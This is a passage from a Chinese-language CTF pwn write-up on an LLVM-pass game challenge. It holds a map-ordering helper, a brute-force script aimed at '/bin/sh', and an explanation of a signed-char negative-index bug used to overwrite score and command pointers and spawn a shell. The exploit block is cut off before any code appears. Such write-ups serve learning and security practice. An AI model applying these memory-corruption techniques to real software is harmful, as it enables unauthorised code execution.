class="string">&quot;lotu60&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu61&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu62&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu63&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu64&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu65&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu66&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu67&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu68&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu69&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu70&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu71&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu72&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu73&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu74&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu75&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu76&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu77&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu78&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu79&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu80&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu81&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu82&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu83&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu84&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu85&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu86&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu87&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu88&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu89&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu90&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu91&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu92&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu93&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu94&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu95&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu96&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu97&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu98&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu99&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu100&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu101&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu102&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu103&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu104&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu105&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu106&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu107&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu108&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu109&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu110&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu111&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu112&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu113&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu114&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu115&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu116&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu117&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu118&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu119&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu120&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu121&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu122&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu123&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu124&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu125&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu126&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu127&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu128&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu129&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu130&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu131&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu132&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu133&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu134&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu135&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu136&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu137&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu138&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu139&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu140&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu141&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu142&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu143&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu144&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu145&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu146&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu147&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu148&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu149&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu150&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu151&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu152&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu153&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu154&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu155&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu156&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu157&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu158&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu159&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu160&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu161&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu162&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu163&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu164&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu165&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu166&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu167&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu168&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu169&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu170&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu171&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu172&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu173&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu174&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu175&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu176&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu177&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu178&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu179&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu180&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu181&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu182&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu183&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu184&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu185&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu186&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu187&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu188&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu189&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu190&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu191&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu192&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu193&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu194&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu195&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu196&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu197&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu198&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu199&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu200&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu201&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu202&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu203&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu204&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu205&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu206&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu207&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu208&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu209&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu210&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu211&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu212&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu213&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu214&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu215&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu216&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu217&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu218&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu219&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu220&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu221&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu222&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu223&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu224&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu225&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu226&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu227&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu228&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu229&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu230&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu231&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu232&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu233&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu234&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu235&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu236&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu237&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu238&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu239&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu240&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu241&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu242&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu243&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu244&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu245&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu246&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu247&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu248&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu249&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu250&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu251&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu252&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu253&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu254&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu255&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    map&lt;string, <span class="keyword">unsigned</span> <span class="keyword">char</span>&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        m[arr[i]] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i = m.<span class="built_in">begin</span>(); i != m.<span class="built_in">end</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;index : &quot;</span> &lt;&lt; showbase &lt;&lt; hex &lt;&lt; index++ &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; i-&gt;first &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就能知道程序里 map 对应的位置了。</p>
<p>我原本以为漏洞出在这里：</p>
<p><img data-src="https://tva1.sinaimg.cn/large/008qDYGVly1h4sc64orwlj30l604wjvh.jpg" alt="4353b8b9-3b67-4fad-8129-d0f8086a76a9"></p>
<p>其中 boss 是 unsigned int，v53 为 int，并且 &lt;= 是 signed 比较，那么理论上就可以通过不断调用 &quot;tiandongwanxiang&quot; 函数来将 boss 整数溢出，这要 v53 和 boss 有符号比较的时候，v53 肯定大于 boss，而 boss 是一个负数，*score 就能刷上来。</p>
<p>然后通过那四种函数组合，按理来说是能够爆破出来 /bin/sh\x00 的（将字符串替换成 /bin/sh\x00）。</p>
<p>于是丢给战队逆向手，写了个脚本没跑出来。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x6668936D277B6892</span></span><br><span class="line">end   = <span class="number">0x0068732f6e69622f</span></span><br><span class="line"></span><br><span class="line">start = [<span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x93</span>, <span class="number">0x6D</span>, <span class="number">0x27</span>, <span class="number">0x7B</span>, <span class="number">0x68</span>, <span class="number">0x92</span>]</span><br><span class="line">end   = [<span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x73</span>, <span class="number">0x2f</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x62</span>, <span class="number">0x2f</span>]</span><br><span class="line"></span><br><span class="line">st = [start]</span><br><span class="line">op = [<span class="string">&quot;0&quot;</span>]</span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(st) <span class="keyword">and</span> flag:</span><br><span class="line">    p = st.pop(<span class="number">0</span>)</span><br><span class="line">    i = op.pop(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    st.append([i^<span class="number">0x14</span> <span class="keyword">for</span> i <span class="keyword">in</span> p])</span><br><span class="line">    op.append(i+<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    st.append([i^<span class="number">0x7F</span> <span class="keyword">for</span> i <span class="keyword">in</span> p])</span><br><span class="line">    op.append(i+<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    st.append([(i-<span class="number">9</span>)&amp;<span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> p])</span><br><span class="line">    op.append(i+<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    st.append([(i+<span class="number">2</span>)&amp;<span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> p])</span><br><span class="line">    op.append(i+<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(st)):</span><br><span class="line">        <span class="keyword">if</span> st[i] == end:</span><br><span class="line">            <span class="built_in">print</span>(op[i])</span><br><span class="line">            <span class="built_in">print</span>(st[i])</span><br><span class="line">            flag = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>实际执行的时候，取 boss 值放到 ecx 里面，然后比较时是用 rcx 做的比较，相当于无符号扩展。此时，boss 值不可能为负数，那这种方法就不可行了。</p>
<p><img data-src="https://tva2.sinaimg.cn/large/008qDYGVly1h4sc6emsyjj30ih030766.jpg" alt="dede928d-10b6-45f2-a0bb-61700d1ca669"></p>
<p>又看了看其他地方有没有符号位扩展的洞，记忆里 upgrate 有，但是没什么用，符号位扩展是针对写进的字符的，不是针对于 idx。</p>
<p>最后发现，v33 是 char，并且这里是对于 v33 是带符号扩展，通过不断 ++v3 可以让 v33 带符号扩展后成为负数。</p>
<p><img data-src="https://tvax1.sinaimg.cn/large/008qDYGVly1h4sc6kcggbj30pg06qn2h.jpg" alt="567cc1eb-51e4-4ccb-ba95-931e7b828cc0"></p>
<p>同时 weapon 数组上方有 score 和 cmd 的指针。</p>
<p>那就通过自己写的 c++ map，来得知程序中 map 的位置，然后负索引部分覆写 score 指针，让她指向一个大的值。本来我还想着在堆附近找一个大一点的值，不过后面一想，随便找了个值错位一下就变得很大了。</p>
<p>改掉 score 指针后，因为逆向手没有跑出来，所以我这还是得改 cmd 指针。本来想着挺简单的，就 add weapon 的时候，c 艹会申请堆块，那把函数名改为 sh 即可。但是调试发现这两堆块地址差太多了，部分覆写没用。爆破了一会也没爆破出来。</p>
<p>不过注意到程序提供的 opt-8 没有开 pie，嘿嘿，那就用她的字符串。</p>
<p>题外话是我最开始运行的时候报错了，后来一看是题目提供的 clang 和我版本不一致，下了个 clang-8。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang-8 -emit-llvm -S yakagame.c -o yakagame.ll</span><br></pre></td></tr></table></figure>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span 